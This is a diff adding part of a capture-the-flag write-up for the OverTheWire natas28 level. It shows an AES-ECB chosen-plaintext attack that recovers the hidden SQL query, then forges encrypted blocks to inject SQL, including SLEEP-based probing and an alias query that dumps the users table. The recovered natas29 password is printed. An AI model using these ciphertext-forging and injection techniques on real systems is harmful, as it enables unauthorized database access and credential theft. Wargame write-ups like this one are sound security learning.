@@ -171,17 +171,207 @@ For figuring out the number of bytes after:
 	|_______________________________________|
 
 	Now add the maximum number of bytes so that the block size doesn't increase, which ends up being 3.
-	(Sent 3 'a's)
-	 _______________________________________
-	|$python getbytes/querytohex.py "aaa"	|
-	|a: 3 b: 0 c: 0 other: 0		|
-	|0: 1be82511a7ba5bfd578c0eef466db59c	|
-	|1: dc84728fdcf89d93751d10a7c75c8cf2	|
-	|2: 2f5293a63acb | 9fe8c7b4e824b76d6a1d	|
-	|3: 9a2e2b5db6f31f19a14f75678eadaa90	|
-	|4: 4249b93e4dea0909479995b9c44b351a	|
-	|_______________________________________|
+	(Sent 12 'a's)
+	 ____________________________________________
+	|python getbytes/querytohex.py "aaaaaaaaaaaa"|
+	|a: 12 b: 0 c: 0 other: 0		     |
+	|0: 1be82511a7ba5bfd578c0eef466db59c	     |
+	|1: dc84728fdcf89d93751d10a7c75c8cf2	     |
+	|2: c0872dee8bc9 | 0b1156913b08a223a39e	     |
+	|3: ce82a9553b65b81280fb6d3bf2900f47	     |
+	|4: 75fd5044fd063d26f6bb7f734b41c899	     |
+	|____________________________________________|
 
-	The last block is now 16 bytes of '\x10', just straight padding.
-	This means we can count a whole block (16) + 
+	For another whole block to be added, the last block would have to contain 16 bytes of data (thereby adding a 16 byte block of entirely padding to the response).
+	Since another block was *not* added, that means the last block is 15 bytes + 1 byte of padding.
+	
+	We also know that we have 12 bytes of input, with the last 2 being at the beginning of block '3'
+	that means there are 14 (16-2) bytes of non-input plaintext in block 3, and the 15 in block 4.
+	Adding them together, you get 14+15, or 29 bytes of data *after* the input!
+
+In conclusion, 38 bytes before, 29 bytes after.
+
+Now that we know this, what is the next step forward?
+
+With that knowledge, you can actually begin to decipher the plaintext through a cheeky little method.
+
+Since we know exactly where our input is, we can do something to decipher the input:
+
+I'll work through this step by step to with this level as an example to hopefully explain it clearly.
+
+
+Since (AES) ECB blocks are encrypted the exact same way, you can do something sneaky.
+
+First, I will send a query with 10 a's, and 16 b's. The 10 a's fill out the third block of plaintext so I know the fourth line of hex is all my own input (16 b's).
+_____________________________________________________________
+$ python getbytes/querytohex.py "aaaaaaaaaabbbbbbbbbbbbbbbb"
+a: 10 b: 16 c: 0 other: 0
+0: 1be82511a7ba5bfd578c0eef466db59c
+1: dc84728fdcf89d93751d10a7c75c8cf2
+2: c0872dee8bc9|: 0b1156913b08a223a39e
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+3: 88a7bd72cda247dae1c3219f054b2e60
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+4: 738a5ffb4a4500246775175ae596bbd6
+5: f34df339c69edce11f6650bbced62702
+_____________________________________________________________
+
+
+Line '3' contains '88a7bd72cda247dae1c3219f054b2e60', which is the 16 b's.
+
+by sending 10 a's and *15* b's instead, the first byte of plaintext that isn't our input is mixed into the block with the 15 b's.
+
+Thus, the block to be encrypted will be 'bbbbbbbbbbbbbbb?' where ? is the unknown plaintext.
+
+_____________________________________________________________
+python getbytes/querytohex.py "aaaaaaaaaabbbbbbbbbbbbbbb"
+a: 10 b: 15 c: 0 other: 0
+0: 1be82511a7ba5bfd578c0eef466db59c
+1: dc84728fdcf89d93751d10a7c75c8cf2
+2: c0872dee8bc9|: 0b1156913b08a223a39e
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+3: 508f19c27764e316847804cfa959901e
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+4: a09522f301cf9d36ac7023f165948c5a
+5: 9739cd90522fa7a86f95773b56f9f8c0
+_____________________________________________________________
+
+In the encrypted response, line 3 now becomes '508f19c27764e316847804cfa959901'.
+
+Now, instead of 10 a's and 15 b's, you can send 10 a's and 15 b's plus a random character.
+
+If you find the same character as the first byte of the unknown plaintext, you will get the same encrypted block!
+
+Using this method you're able to find the first character, which ends up being '%'.
+
+(Looking for 3 to be '508f19c27764e316847804cfa959902')
+___________________________________________________________
+python getbytes/querytohex.py "aaaaaaaaaabbbbbbbbbbbbbbb%"
+a: 10 b: 15 c: 0 other: 1
+0: 1be82511a7ba5bfd578c0eef466db59c
+1: dc84728fdcf89d93751d10a7c75c8cf2
+2: c0872dee8bc9|: 0b1156913b08a223a39e
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+3: 508f19c27764e316847804cfa959901e
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+4: 738a5ffb4a4500246775175ae596bbd6
+5: f34df339c69edce11f6650bbced62702
+___________________________________________________________
+
+As you can see in the above example, sending 10 a's, 15 b's, and % makes the encrypted line the same.
+
+Knowing the first character is a % told me that this is some kind of SQL query that is searching for jokes using 'like %', similar to how the password was built in natas17.
+
+Using this method, you can slowly decrease the number of b's and build up the plaintext.
+
+Unfortunately, you can only decrypt the first character in the front before it stops working... why?
+
+Well, after the % is likely going to be a quote from the way SQL syntax is usually built.
+
+It would appear that natas28 is in fact escaping characters which sucks... but instead of going from the front, why not hit it from the back.
+
+This can be done exactly the same way, except you create a line with padding based off of your length of input on TOP of the 16 b's.
+
+you then slowly increase the number of b's to push the data back into the last block with the padding.
+
+Then you test characters in your own fake 'padding' block to see if you get an equal encrypted block.
+
+Doing this nets you two characters, '3;' before running into another character that gets escaped.
+
+All in all, it looks like the encrypted string in '/?query=' is this:
+
+'38 bytes' + 'escaped_user_input' + '%.........3;'
+
+Thinking back to the very beginning, 3 jokes are outputted onto the webpage of natas28 when you do a search, random each time.
+
+To construct the final sql query, I put all the information together and made a guess:
+
+'SELECT * FROM jokes WHERE joke LIKE '%userinput_escaped%' ORDER BY RAND() LIMIT 3;'
+
+Selecting all jokes from the joke where the joke is like the user input, ordering them randomly and limiting the input by 3!
+
+This ends up being exactly 38 bytes before the user input, and very close to 29 after....
+
+Now with all this information, how can you attack the level...?
+
+
+We're able to get our own perfectly encrypted query due to the way ECB works, padding and all
+
+Because of that, we can pass a command like 'SELECT * FROM jokes;' and get a response in bytes WITH padding.
+
+I wrote a python utility similar to the querytohex one.
+
+This one converts my input to bytes with a buffer, adds the padding necessary in byte format, and sends it to natas28.
+
+It then receives the /?query= field and converts it to bytes.
+___________________________________________________________________________
+$ python injectresponse.py 'SELECT * FROM jokes;' yes
+bytearray(b'aaaaaaaaaaSELECT * FROM jokes;\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c')
+0: 1be82511a7ba5bfd578c0eef466db59c
+1: dc84728fdcf89d93751d10a7c75c8cf2
+2: c0872dee8bc90b1156913b08a223a39e
+3: eaf50dd768f1418c5dde5c5fd3d3c08c
+4: 2d7fa1ef85d8ae14574d11bfd46b7d5b
+5: 738a5ffb4a4500246775175ae596bbd6
+6: f34df339c69edce11f6650bbced62702
+____________________________________________________________________________
+
+Viewing this, we know exactly where our input would be: after line 2, and before line 5.
+
+'eaf50dd768f1418c5dde5c5fd3d3c08c2d7fa1ef85d8ae14574d11bfd46b7d5b'
+
+Together, line 3 and 4 yield those bytes. Converting them from hex to bytes, encoding them with base64, and url encoding them nets this:
+
+'6vUN12jxQYxd3lxf09PAjC1%2Foe%2BF2K4UV00Rv9RrfVs%3D'
+
+and sending that to natas28 as the query:
+
+'https://natas28.natas.labs.overthewire.org/search.php/?query=6vUN12jxQYxd3lxf09PAjC1%2Foe%2BF2K4UV00Rv9RrfVs%3D'
+
+Displays EVERY joke!!!! Very exciting, we can now send any kind of MySQL query we want (minus quotes!).
+
+
+Now what query do we send to get the password for natas29?
+
+Well... if you send a query that isn't from the jokes table you get:
+
+'Undefined index: joke in /var/www/natas/natas28/search.php on line 92'
+
+Seems like you need a response that is a 'joke' to get anything.
+
+There is also the matter of where natas29's information is stored.
+
+Fortunately, you can test this out using a similar query to the time-based sql injection level.
+Knowing that in previous levels there was a 'users' table with 'username' and 'password' columns...
+
+If you send 'SELECT IF(COUNT(username)>0, SLEEP(5), SLEEP(0)) from users;'
+
+The response takes over 5 seconds, meaning that there is in fact a 'username' column and a 'users' table.
+
+You can do the same with 'password'.
+
+Ok, so now how do we view the data from that table???
+
+If you send 'SELECT username FROM users;' you get the same 'joke' index error, same goes for password.
+
+So maybe if you pass off those fields as 'jokes' instead? 
+
+Fortunately, there are 'aliases' in MySQL that allow you to do just that.
+
+They allow you to make a query like this:
+
+'SELECT username AS joke FROM users AS jokes;'
+
+Doing so nets you the response 'natas29'. OH MY GOD!
+Sending:
+
+'SELECT password AS joke FROM users AS jokes;'
+You get: 'airooCaiseiyee8he8xongien9euhe8b'!!!!
+
+That's it!!!!!!!
+
+natas29:airooCaiseiyee8he8xongien9euhe8b
+
+
+What a fantastic level. Very difficult, but very informative!
 
